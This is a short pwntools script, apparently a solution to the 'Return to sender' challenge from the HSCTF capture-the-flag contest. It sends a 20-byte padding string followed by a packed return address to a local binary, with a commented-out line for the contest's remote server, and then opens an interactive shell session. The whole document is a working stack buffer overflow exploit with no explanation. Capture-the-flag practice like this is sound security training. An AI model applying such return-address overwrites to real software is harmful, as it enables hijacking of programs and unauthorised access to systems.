#Return to sender

from pwn import *

p = process("./return-to-sender")
#p = remote('pwn.hsctf.com',1234)

p.recv()

hex_int = int("0x80491b6", 16)
p.sendline("A"*20+p32(hex_int))

p.interactive()
